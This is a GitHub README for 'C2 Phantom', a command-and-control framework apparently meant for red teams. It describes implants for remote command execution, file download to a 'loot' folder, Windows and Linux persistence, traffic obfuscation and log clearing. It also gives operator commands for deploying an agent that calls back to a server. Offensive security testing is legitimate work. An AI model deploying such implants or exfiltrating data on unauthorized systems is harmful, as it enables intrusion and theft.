<div align="center">

# 🔮 C2 Phantom

### Professional Command & Control Framework

*Robust C2 infrastructure with AES-256-GCM encryption, real command execution, and cross-platform support*

[![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-Educational-critical?style=for-the-badge)](LICENSE)
[![Security](https://img.shields.io/badge/Encryption-AES--256--GCM-success?style=for-the-badge&logo=lock)](https://en.wikipedia.org/wiki/Galois/Counter_Mode)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-blue?style=for-the-badge)]()

<p align="center">
  <a href="#-features">Features</a> •
  <a href="#-installation">Installation</a> •
  <a href="#-quick-start">Quick Start</a> •
  <a href="#-architecture">Architecture</a> •
  <a href="#-documentation">Documentation</a>
</p>

</div>

---

## ⚠️ LEGAL DISCLAIMER

**This tool is for AUTHORIZED SECURITY TESTING ONLY.**

- Only use on systems you own or have EXPLICIT WRITTEN PERMISSION to test
- Unauthorized access to computer systems is ILLEGAL
- Users are responsible for compliance with all applicable laws
- Misuse may result in criminal prosecution

This is a professional security research tool. Use ethically and responsibly.

---

## ✨ Features

### Core Capabilities

✅ **Real Command Execution** - Execute shell commands via subprocess on target systems  
✅ **File Transfer** - Binary-safe file upload/download with base64 encoding  
✅ **Session Management** - Track and manage multiple compromised systems  
✅ **RESTful API** - HTTP-based C2 server with JSON API  
✅ **Beautiful CLI** - Rich terminal interface with progress bars and colors  

### Security Features

🔒 **AES-256-GCM Encryption** - Military-grade encryption for all communications  
🔒 **RSA-4096 Key Exchange** - Secure key establishment  
🔒 **ECC Cryptography** - Elliptic curve support  
🔒 **Secure Key Storage** - Encrypted key management with Windows keyring support  

### Persistence & Evasion

🛡️ **Windows Persistence** - Registry, Scheduled Tasks, WMI, Startup folder  
🛡️ **Linux Persistence** - Systemd services, cron jobs  
🛡️ **Beacon Jitter** - Randomized callback intervals  
🛡️ **Traffic Obfuscation** - Domain fronting, proxy chains  

### Cross-Platform

🖥️ Windows 10/11  
🐧 Linux (Ubuntu, Debian, Kali)  
🍎 macOS  

---

## 🚀 Installation

```bash
# Clone repository
git clone https://github.com/4fqr/c2-phantom.git
cd c2-phantom

# Create virtual environment
python -m venv .venv

# Activate (Windows)
.venv\Scripts\activate

# Activate (Linux/Mac)
source .venv/bin/activate

# Install
pip install -e .

# Initialize framework
phantom init
```

---

## ⚡ Quick Start

### 1. Start C2 Server

```bash
phantom server --host 0.0.0.0 --port 8443
```

### 2. Deploy Agent

```bash
# On target system
python -m c2_phantom.agent --server http://YOUR_SERVER:8443
```

### 3. Execute Commands

```bash
# List sessions
phantom list --status active

# Execute command
phantom execute "whoami" --session <SESSION_ID> --output

# Upload file
phantom upload local.txt C:\Temp\file.txt --session <SESSION_ID>

# Download file
phantom download C:\Temp\data.zip ./loot/data.zip --session <SESSION_ID>
```

---

## 🏗️ Architecture

```
┌──────────────────┐
│   Operator CLI   │  <- phantom commands
│  (C2 Client)     │
└────────┬─────────┘
         │ HTTP REST API (AES-256-GCM)
         │
┌────────▼─────────┐
│    C2 Server     │  <- aiohttp REST server
│  (port 8443)     │     Queue commands
└────────┬─────────┘     Store results
         │               Manage sessions
         │ HTTP Beacon (Encrypted)
         │
┌────────▼─────────┐
│   Agent/Implant  │  <- Runs on target
│   (Target Host)  │     Execute commands
└──────────────────┘     Transfer files
                         Maintain persistence
```

### Technology Stack

**Backend:**
- `aiohttp` - Async HTTP server
- `cryptography` - AES-256-GCM, RSA-4096, ECC
- `asyncio` - Async I/O

**Frontend:**
- `click` - CLI framework
- `rich` - Terminal UI
- `pydantic` - Data validation

---

## 📚 Documentation

- **[Professional Guide](PROFESSIONAL-GUIDE.md)** - Complete operator manual
- **[Real C2 Testing](TESTING-REAL-C2.md)** - End-to-end testing guide
- **[Architecture Guide](REAL-C2-GUIDE.md)** - Technical deep dive

### Command Reference

#### Server

```bash
phantom server --host 0.0.0.0 --port 8443
```

#### Session Management

```bash
phantom list [--status active|inactive|all] [--format table|json]
```

#### Command Execution

```bash
phantom execute COMMAND --session <ID> [--timeout 30] [--output]
```

#### File Operations

```bash
phantom upload LOCAL REMOTE --session <ID>
phantom download REMOTE LOCAL --session <ID>
```

---

## 🔐 Security Best Practices

1. **Use HTTPS** - Always use TLS/SSL in production
2. **Strong Encryption** - Enable AES-256-GCM encryption
3. **Rotate Keys** - Change encryption keys regularly  
4. **Clean Logs** - Clear operational artifacts after engagement
5. **Test First** - Always test in isolated lab environment

---

## 🛠️ Development

### Project Structure

```
c2-phantom/
├── c2_phantom/
│   ├── agent.py              # Agent/implant
│   ├── cli.py                # Operator CLI
│   ├── core/
│   │   ├── session.py        # Session management
│   │   ├── persistence.py    # Persistence mechanisms
│   │   └── config.py         # Configuration
│   ├── network/
│   │   ├── server.py         # C2 server (aiohttp)
│   │   ├── client.py         # C2 client
│   │   └── secure_channel.py # Encryption layer
│   ├── crypto/
│   │   ├── encryption.py     # AES/RSA/ECC
│   │   └── keys.py           # Key management
│   └── evasion/
│       ├── obfuscation.py    # Code obfuscation
│       └── timing.py         # Timing jitter
└── tests/                    # Unit tests
```

### Running Tests

```bash
pytest tests/
```

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

---

## 📜 License

This project is for **educational and authorized security testing purposes only**.

See [LICENSE](LICENSE) for details.

---

## 🙏 Credits

Developed for professional security operations and red team training.

**Built with:**
- Python 3.9+
- aiohttp for async HTTP
- cryptography for encryption
- rich for beautiful terminal UI

---

## 📞 Support

- **Issues:** [GitHub Issues](https://github.com/4fqr/c2-phantom/issues)
- **Documentation:** [Wiki](https://github.com/4fqr/c2-phantom/wiki)

---

<div align="center">

**⚠️ Remember: With great power comes great responsibility. Use ethically. ⚠️**

Made with 💜 for the security community

</div>
